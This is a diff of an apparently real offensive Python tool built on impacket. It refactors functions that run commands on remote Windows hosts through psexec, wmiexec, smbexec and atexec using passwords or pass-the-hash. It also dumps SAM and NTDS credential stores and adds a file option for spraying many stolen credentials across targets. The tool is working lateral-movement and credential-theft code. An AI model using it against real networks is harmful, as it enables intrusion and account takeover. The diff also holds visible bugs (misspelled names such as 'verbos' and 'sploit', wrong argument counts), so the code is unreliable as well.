@@ -26,7 +26,6 @@ except Exception:
     logging.critical("Warning: You don't have any crypto installed. You need PyCrypto")
     logging.critical("See http://www.pycrypto.org/")
 try:
-    import secretsdump
     from impacket import smbserver, version, ntlm, uuid, winregistry, smbconnection
     from impacket.smbconnection import *
     from impacket.dcerpc.v5.dcomrt import DCOMConnection
@@ -3237,23 +3236,29 @@ def get_networks(gateways_dict):
 HASH MANIPULATION FUNCTIONS
 '''
 
-def hash_test(LM, NTLM, pwd):
-    print("[*] Hash detected")
+def hash_test(LM, NTLM, pwd, usr, verbose):
+    if verbose > 1:
+        print("[*] Hash detected for %s") % (usr)
     blank_ntlm = re.search(r'31d6cfe0d16ae931b73c59d7e0c089c0',NTLM, re.IGNORECASE)
     blank_lm = re.search(r'aad3b435b51404eeaad3b435b51404ee',LM, re.IGNORECASE)
     blank_lm_instances = len(re.findall(r'aad3b435b51404ee', LM, re.IGNORECASE))
     bad_format = re.search(r'NOPASSWORD',LM, re.IGNORECASE)
     if bad_format:
-        print("[*] The hash was badly formatted, so padding it")
+        if verbose > 1:
+            print("[*] The hash for %s was badly formatted, so padding it") % (usr)
         LM = "aad3b435b51404eeaad3b435b51404ee"
     if blank_lm and blank_ntlm:
-        print("[*] You do know this password is blank right?")
+        if verbose > 1:
+            print("[*] You do know the password for %s is blank right?") % (usr)
     elif blank_lm_instances == 1 and not blank_lm:
-        print("[*] The hashed password is less than eight characters")
+        if verbose > 1:
+            print("[*] The hashed password for %s is less than eight characters") % (usr)
     elif blank_lm and blank_ntlm:
-        print("[*] LM hashes are disabled, so focus on cracking the NTLM")
+        if verbos > 1:
+            print("[*] LM hashes are disabled for %s, so focus on cracking the NTLM") % (usr)
     hash = LM + ":" + NTLM
-    print("[*] Your formated hash is: %s") % (hash)
+    if verbose > 1:
+        print("[*] Your formated hash for %s is: %s") % (usr, hash)
     pwd = ""
     return(LM, NTLM, pwd, hash)
 
@@ -3299,176 +3304,173 @@ def smb_server(working_dir, share_name):
 METHOD FUNCTIONS
 '''
 
-def atexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port):
-    for dst in final_targets:
-        if scan_type:
-            state = verify_open(verbose, scan_type, verify_port, dst)
-            if not state:
-                if verbose > 1:
-                    print("[-] Host %s port %s is closed") % (dst, verify_port)
-                continue
-        if attacks:
-            srv = delivery_server(src_port, cwd, delivery, share_name)
+def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port):
+    if hash and not pwd:
+        print("[-] --atexec requires a password, please try a different user or crack hash %s for user %s") % (hash, usr)
+        return
+    if scan_type:
+        state = verify_open(verbose, scan_type, verify_port, dst)
+        if not state:
+            if verbose > 1:
+                print("[-] Host %s port %s is closed") % (dst, verify_port)
+            return #replaced continue inside a function
+    if attacks:
+        srv = delivery_server(src_port, cwd, delivery, share_name)
+    if hash:
+        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+    else:
+        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+    if command == "cmd.exe":
+        sys.exit("[!] Please provide a viable command for execution")
+    shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command, proto = protocol)
+    shell.play(dst)
+    if attacks and not encoder:
+        srv = delivery_server(src_port, cwd, delivery, share_name)
         if hash:
             print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
         else:
             print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
         if command == "cmd.exe":
             sys.exit("[!] Please provide a viable command for execution")
-        shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command, proto = protocol)
+        shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command, proto = protocol)
         shell.play(dst)
-        if attacks and not encoder:
-            srv = delivery_server(src_port, cwd, delivery, share_name)
-            if hash:
-                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
-            else:
-                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-            if command == "cmd.exe":
-                sys.exit("[!] Please provide a viable command for execution")
-            shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command, proto = protocol)
-            shell.play(dst)
-        if attacks:
-            if srv:
-               srv.terminate()
-               print("[*] Shutting down the catapult %s server for %s"  % (str(delivery), str(dst)))
+    if attacks:
+        if srv:
+           srv.terminate()
+           print("[*] Shutting down the catapult %s server for %s"  % (str(delivery), str(dst)))
 
-def psexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port):
-    for dst in final_targets:
-        if scan_type:
-            state = verify_open(verbose, scan_type, verify_port, dst)
-            if not state:
-                if verbose > 1:
-                    print("[-] Host %s port %s is closed") % (dst, verify_port)
-                continue 
-        if attacks:
-            #print(instructions)
-            srv = delivery_server(src_port, cwd, delivery, share_name)
+def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port):
+    if scan_type:
+        state = verify_open(verbose, scan_type, verify_port, dst)
+        if not state:
+            if verbose > 1:
+                print("[-] Host %s port %s is closed") % (dst, verify_port)
+            return #replaced continue inside a function 
+    if attacks:
+        #print(instructions)
+        srv = delivery_server(src_port, cwd, delivery, share_name)
+    if hash:
+        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+    else:
+        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+    shell = PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
+    shell.run(dst)
+    if srv:
+        srv.terminate()
+        print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
+
+def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port):
+    if scan_type:
+        state = verify_open(verbose, scan_type, verify_port, dst)
+        if not state:
+            if verbose > 1:
+                print("[-] Host %s port %s is closed") % (dst, verify_port)
+            return #replaced continue inside a function
+    if attacks:
+        print(instructions)
+        srv = delivery_server(src_port, cwd, delivery, share_name)
+    if hash:
+        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+    else:
+        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+    shell = CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
+    shell.run(dst)
+    if srv:
+        srv.terminate()
+        print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
+
+def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port):
+    if scan_type:
+        state = verify_open(verbose, scan_type, verify_port, dst)
+        if not state:
+            if verbose > 1:
+                print("[-] Host %s port %s is closed") % (dst, verify_port)
+            return #replaced continue inside a function
+    if attacks and encoder:
         if hash:
             print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
         else:
             print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-        shell = PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
-        shell.run(dst)
-        if srv:
-            srv.terminate()
-            print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
-
-def smbexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port):
-    for dst in final_targets:
-        if scan_type:
-            state = verify_open(verbose, scan_type, verify_port, dst)
-            if not state:
-                if verbose > 1:
-                    print("[-] Host %s port %s is closed") % (dst, verify_port)
-                continue
-        if attacks:
-            print(instructions)
-            srv = delivery_server(src_port, cwd, delivery, share_name)
+        if command == "cmd.exe":
+            sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
+        with Timeout(100):
+            try:
+                srv = delivery_server(src_port, cwd, delivery, share_name)
+                shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                shell.run(dst)
+            except Exception, e:
+                print("[!] An error occurred: %s") % (e)
+                if srv:
+                    srv.terminate()
+                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
+                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
+                    return #replaced continue inside a function
+    elif attacks and not encoder:
         if hash:
             print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
         else:
             print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-        shell = CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
-        shell.run(dst)
-        if srv:
-            srv.terminate()
-            print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
-
-def wmiexec_func(final_targets, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port):
-    for dst in final_targets:
-        if scan_type:
-            state = verify_open(verbose, scan_type, verify_port, dst)
-            if not state:
-                if verbose > 1:
-                    print("[-] Host %s port %s is closed") % (dst, verify_port)
-                continue
-        if attacks and encoder:
-            if hash:
-                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
-            else:
-                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-            if command == "cmd.exe":
-                sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
-            with Timeout(100):
-                try:
-                    srv = delivery_server(src_port, cwd, delivery, share_name)
-                    shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-                    shell.run(dst)
-                except Exception, e:
-                    print("[!] An error occurred: %s") % (e)
-                    if srv:
-                        srv.terminate()
-                        print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
-                        print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
-                        continue # changed from pass
-        elif attacks and not encoder:
-            if hash:
-                print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
-            else:
-                print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-            if command == "cmd.exe":
-                sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
-            with Timeout(100):
-                try:
-                    srv = delivery_server(src_port, cwd, delivery, share_name)
-                    shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-                    shell.run(dst)
-                except Exception, e:
-                    print("[!] An error occurred: %s") % (e)
-                    if srv:
-                        srv.terminate()
-                        print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
-                        print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
-                        continue # changed from pass pass
-        else:
-            with Timeout(100):
-                try:
-                    srv = delivery_server(src_port, cwd, delivery, share_name)
-                    shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-                    shell.run(dst)
-                except Exception, e:
-                    print("[!] An error occurred: %s") % (e)
-                    if srv:
-                        srv.terminate()
-                        print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
-                        print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
-                        continue #changed from pass
+        if command == "cmd.exe":
+            sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
+        with Timeout(100):
+            try:
+                srv = delivery_server(src_port, cwd, delivery, share_name)
+                shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                shell.run(dst)
+            except Exception, e:
+                print("[!] An error occurred: %s") % (e)
+                if srv:
+                    srv.terminate()
+                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
+                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
+                    return #changed from continue inside a function
+    else:
+        with Timeout(100):
+            try:
+                srv = delivery_server(src_port, cwd, delivery, share_name)
+                shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                shell.run(dst)
+            except Exception, e:
+                print("[!] An error occurred: %s") % (e)
+                if srv:
+                    srv.terminate()
+                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
+                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
+                    return # changed from continue inside a function
 
 def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port): 
-    for dst in final_targets:
-        if scan_type:
-            state = verify_open(verbose, scan_type, verify_port, dst)
-            if not state:
-                if verbose > 1:
-                    print("[-] Host %s port %s is closed") % (dst, verify_port)
-                continue
-        if methods:
-            sys.exit("[!] The --scout option is run without methods")
-        if hash:
-            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
-        else:
-            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-        opted = NetviewDetails(user = None, users = None, target = dst, targets = None, noloop = True, delay = '10', max_connections = '1000', domainController = None, debug = False)
-        shell = USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
-        shell.run()
+    if scan_type:
+        state = verify_open(verbose, scan_type, verify_port, dst)
+        if not state:
+            if verbose > 1:
+                print("[-] Host %s port %s is closed") % (dst, verify_port)
+            return #replaced continue inside a function
+    if methods:
+        sys.exit("[!] The --scout option is run without methods")
+    if hash:
+        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+    else:
+        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+    opted = NetviewDetails(user = None, users = None, target = dst, targets = None, noloop = True, delay = '10', max_connections = '1000', domainController = None, debug = False)
+    shell = USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
+    shell.run()
 
-def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, final_targets, pwd, scan_type, verbose, verify_port):
-    for dst in final_targets:
-        if scan_type:
-            state = verify_open(verbose, scan_type, verify_port, dst)
-            if not state:
-                if verbose > 1:
-                    print("[-] Host %s port %s is closed") % (dst, verify_port)
-                continue
-        if hash:
-            print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
-        else:
-            print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-        shell = DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
-        try:
-            shell.dump()
-        except Execption, e:
-            print("[!] An error occured during execution")
+def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port):
+    if scan_type:
+        state = verify_open(verbose, scan_type, verify_port, dst)
+        if not state:
+            if verbose > 1:
+                print("[-] Host %s port %s is closed") % (dst, verify_port)
+            return #replaced continue inside a function
+    if hash:
+        print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
+    else:
+        print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
+    shell = DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
+    try:
+        shell.dump()
+    except Execption, e:
+        print("[!] An error occured during execution")
 
 
 def instructions_func(payload, src_port, command, unprotected_command, smbexec_cmd, execution, delivery):
@@ -3586,6 +3588,60 @@ def verify_open(verbose, scan_type, port, dst):
     else:
         return(False)
 
+def pwd_test(pwd, verbose, usr = None):
+    SID = None
+    NTLM = ""
+    LM = ""
+    hash = None
+    if pwd and ":" in pwd and pwd.count(':') == 6:
+        pwdump_format_hash = pwd.split(':')
+        if not usr:
+            usr = pwdump_format_hash[0].lower()
+        SID = pwdump_format_hash[1]
+        LM = pwdump_format_hash[2]
+        NTLM = pwdump_format_hash[3]
+        pwd = None
+    if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
+        LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd, usr, verbose)
+    if pwd and ":" in pwd and pwd.count(':') == 1:
+        if pwd.startswith(':'):
+            LM, NTLM = pwd.split(':')
+            if LM == "":
+                LM = "aad3b435b51404eeaad3b435b51404ee"
+        else:
+            LM, NTLM = pwd.split(':')
+        if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
+            LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd, usr, verbose)
+    return(SID, LM, NTLM, hash, usr, pwd)
+
+def is_empty(structure):
+    if structure:
+        return False
+    else:
+        return True
+
+def method_func(psexec_cmd, wmiexec_cmd, netview_cmd, smbexec_cmd, atexec_cmd, sam_dump, dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, final_targets, system, security, sam, ntds, no_output):
+    if psexec_cmd:
+        for dst in final_targets:
+            psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port)
+    elif wmiexec_cmd:
+        for dst in final_targets:
+            wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port)
+    elif netview_cmd:
+        for dst in final_targets:
+            netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port)
+    elif smbexec_cmd:
+        for dst in final_targets:
+            smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port)
+    elif atexec_cmd:
+        for dst in final_targets:
+            atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port)
+    elif sam_dump:
+        for dst in final_targets:
+            sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port)
+    else:
+        print(instructions)   
+
 def main():
     # If script is executed at the CLI
     usage = '''
@@ -3604,7 +3660,7 @@ Create Pasteable Double Encoded Script:
     group3 = parser.add_argument_group('SAM and NTDS.DIT Options, used with --secrets-dump')
     iex_options = parser.add_argument_group('Payload options to tell ranger where to source the attack information')
     remote_attack = parser.add_argument_group('Remote Target Options')
-    generator = parser.add_argument_group('Filename for randimization of script')
+    #generator = parser.add_argument_group('Filename for randimization of script')
     obfiscation = parser.add_argument_group('Tools to obfiscate the execution of scripts')
     method = group1.add_mutually_exclusive_group()
     attack = group2.add_mutually_exclusive_group()
@@ -3632,12 +3688,13 @@ Create Pasteable Double Encoded Script:
     remote_attack.add_argument("--dom", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
     remote_attack.add_argument("--usr", action="store", dest="usr", default=None, help="The username that will be used to exploit the system")
     remote_attack.add_argument("--pwd", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
+    remote_attack.add_argument("--creds-file", action="store", dest="creds_file", default=None, help="A file with multiple lines of credentials with each element deliniated by a space, domains are optional in the file, and can be applied universally to all creds with the --dom argument, the same hash formats accepted by command line are accepted in the file to include Metasploit PWDUMP, Metasploit hash_dump and smart_hash_dump formats, each line of the file should be formated as one of the following: username password, username hash, username password domain, username hash, Hash_in_PWDUMP_format, Hash_in_PWDUMP_format domain")
     method.add_argument("--psexec", action="store_true", dest="psexec_cmd", help="Inject the invoker process into the system memory with psexec")
     method.add_argument("--wmiexec", action="store_true", dest="wmiexec_cmd", help="Inject the invoker process into the system memory with wmiexec")
     method.add_argument("--smbexec", action="store_true", dest="smbexec_cmd", help="Inject the invoker process into the system memory with smbexec")
     method.add_argument("--atexec", action="store_true", dest="atexec_cmd", help="Inject the command task into the system memory with at on systems older than Vista")
     attack.add_argument("--scout", action="store_true", dest="netview_cmd", help="Identify logged in users on a target machine")
-    generator.add_argument("--filename", action="store", dest="filename", default=None, help="The file that the attack script will be dumped to")
+    #generator.add_argument("--filename", action="store", dest="filename", default=None, help="The file that the attack script will be dumped to")
     remote_attack.add_argument("--aes", action="store", dest="aes_key", default=None, help="The AES Key Option")
     remote_attack.add_argument("--share", action="store", default="ADMIN$", dest="share", help="The Share to execute against, the default is ADMIN$")
     remote_attack.add_argument('--mode', action="store", dest="mode", choices=['SERVER','SHARE'], default="SERVER", help="Mode to use for --smbexec, default is SERVER, which requires root access, SHARE does not")
@@ -3650,7 +3707,7 @@ Create Pasteable Double Encoded Script:
     obfiscation.add_argument("--encoder", action="store_true", help="Set to encode the commands that are being executed")
     #obfiscation.add_argument("--delivery", action="store", dest="delivery", choices=['web','smb'], default="web", help="Set the type of catapult server the payload will be downloaded from, web or smb")
     obfiscation.add_argument("--share-name", action="store", dest="share_name", default="ranger", help="Provide a specific share name to reference with SMB delivery")
-    parser.add_argument("-l", "--logfile", action="store", dest="log", default="results.log", type=str, help="The log file to output the results")
+    parser.add_argument("-l", "--logfile", action="store", dest="log", default="/opt/ranger/log/results.log", type=str, help="The log file to output the results")
     parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
     parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
     parser.add_argument("--update", action="store_true", dest="update", default=False, help="Updates ranger and the supporting libraries")
@@ -3712,7 +3769,7 @@ Create Pasteable Double Encoded Script:
     exceptor = args.exceptor
     exception_filename = args.exception_filename
     command = args.command
-    filename = args.filename
+    #filename = args.filename
     sam_dump = args.sam_dump
     mode = args.mode.upper()
     system = args.system
@@ -3725,6 +3782,7 @@ Create Pasteable Double Encoded Script:
     xml_exceptions = args.xml_exceptions
     scan_tcp = args.scan_tcp
     scan_syn = args.scan_syn
+    creds_file = args.creds_file
     targets_list = []
     exceptions_list = []
     tgt_list = []
@@ -3748,6 +3806,15 @@ Create Pasteable Double Encoded Script:
     entry = []
     processed_xml_targets_dict = {}
     processed_xml_exceptions_dict = {}
+    creds_list = []
+    creds_dict = {}
+    temp_key = None
+    SID_temp = None
+    LM_temp = ""
+    hash_temp = None
+    usr_temp = None
+    pwd_temp = None
+    NTLM_temp = ""
 
     # Configure logger formats for STDERR and output file
     file_handler.setFormatter(format)
@@ -3773,8 +3840,8 @@ Create Pasteable Double Encoded Script:
 
     if aes != None:
         kerberos = True
-    if filename:
-        payload = filename
+    #if filename:
+    #    payload = filename
 
     if smbexec_cmd or wmiexec_cmd or psexec_cmd or atexec_cmd:
         methods = True
@@ -3788,6 +3855,90 @@ Create Pasteable Double Encoded Script:
 
     if not (methods or sam_dump or netview_cmd) and (scan_type):
         sys.exit("[!] If you are going to execute a verification scan you have to choose a method to use for exploiting a target")
+
+    if creds_file:
+        with open(creds_file) as f:
+            creds_list = f.readlines()
+        for cred in creds_list:
+            if cred and ":" in cred and cred.count(':') == 6:
+                if cred.count(' ') == 1:
+                    cred = cred.rstrip()
+                    hash_temp, dom_temp = cred.split(' ')
+                    if "WORKGROUP" not in dom:
+                        dom_temp = dom
+                    SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose)
+                    temp_key = "%s\%s" % (dom_temp, usr_temp)
+                    print(temp_key) #DEBUG
+                    if not usr_temp:
+                        sys.exit("[!] Hash %s does not have a username") % (hash_temp)
+                    if temp_key in creds_dict:
+                        temp_list = creds_dict[temp_key]
+                        temp_list[0] = SID_temp
+                        temp_list[1] = LM_temp
+                        temp_list[2] = NTLM_temp
+                        temp_list[3] = hash_temp    
+                    else:
+                        creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
+                elif cred.count(' ') == 0:
+                    hash_temp = cred.rstrip()
+                    dom_temp = dom
+                    SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose)
+                    temp_key = "%s\%s" % (dom_temp, usr_temp)
+                    if not usr_temp:
+                        sys.exit("[!] Hash %s does not have a username") % (hash_temp)
+                    if temp_key in creds_dict:
+                        temp_list = creds_dict[temp_key]
+                        temp_list[0] = SID_temp
+                        temp_list[1] = LM_temp
+                        temp_list[2] = NTLM_temp
+                        temp_list[3] = hash_temp
+                    else:
+                        creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
+            elif cred and ":" in cred and cred.count(':') == 1:
+                if cred.count(' ') == 1:
+                    cred = cred.rstrip()
+                    usr_temp, hash_temp = cred.split(' ')
+                    dom_temp = dom
+                    SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose, usr_temp, dom_temp)
+                    temp_key = "%s\%s" % (dom_temp, usr_temp)
+                    if not usr_temp:
+                        sys.exit("[!] Hash %s does not have a username") % (hash_temp)
+                    if temp_key in creds_dict:
+                        temp_list = creds_dict[temp_key]
+                        temp_list[0] = SID_temp
+                        temp_list[1] = LM_temp
+                        temp_list[2] = NTLM_temp
+                        temp_list[3] = hash_temp
+                    else:
+                        creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
+                elif cred.count(' ') == 2:
+                    cred = cred.rstrip()
+                    usr_temp, pwd_temp, dom_temp = cred.sploit(' ')
+                    temp_key = "%s\%s" % (dom_temp, usr_temp)
+            elif cred.count(' ') == 1:
+                cred = cred.rstrip()
+                dom_temp = dom
+                if "WORKGROUP" not in dom:
+                    dom_temp = dom
+                usr_temp, pwd_temp = cred.split(' ')
+                temp_key = "%s\%s" % (dom_temp, usr_temp)
+                if not usr_temp:
+                    sys.exit("[!] Hash %s does not have a username") % (hash_temp)
+                if temp_key in creds_dict:
+                    temp_list = creds_dict[temp_key]
+                    temp_list[4] = usr_temp
+                    temp_list[5] = pwd_temp
+                else:
+                    creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
+            elif cred.count(' ') == 2:
+                cred = cred.rstrip()
+                usr_temp, pwd_temp, dom_temp = cred.split(' ')
+                if "WORKGROUP" not in dom:
+                   dom_temp = dom
+                temp_key = "%s\%s" % (dom_temp, usr_temp)
+                creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp]
+            else:
+                sys.exit("[!] An error occured trying to parse the credential file")
 
     if smbexec_cmd:
         verify_port, verify_service = protocol.split('/')
@@ -3806,29 +3957,15 @@ Create Pasteable Double Encoded Script:
         print("[!] This script requires either a command, an invoker attack, or a downloader attack")
         parser.print_help()
         sys.exit(1)
-    if pwd and ":" in pwd and pwd.count(':') == 6:
-        pwdump_format_hash = pwd.split(':')
-        if not usr:
-            usr = pwdump_format_hash[0].lower()
-        SID = pwdump_format_hash[1]
-        LM = pwdump_format_hash[2]
-        NTLM = pwdump_format_hash[3]
-    if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
-        LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd)
-    if pwd and ":" in pwd and pwd.count(':') == 1:
-        if pwd.startswith(':'):
-            LM, NTLM = pwd.split(':')
-            if LM == "":
-                LM = "aad3b435b51404eeaad3b435b51404ee"
-        else:
-            LM, NTLM = pwd.split(':')
-        if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
-            LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd)
+
+    if pwd and ":" in pwd and not creds_dict:
+        SID, LM, NTLM, hash, usr, pwd = pwd_test(pwd, verbose, usr)
+
+    creds_dict_status = is_empty(creds_dict)
 
     if smbexec_cmd or wmiexec_cmd or atexec_cmd or psexec_cmd or sam_dump:
         method_dict = {"smbexec" : smbexec_cmd, "wmiexec" : wmiexec_cmd, "atexec" : atexec_cmd, "psexec" : psexec_cmd}
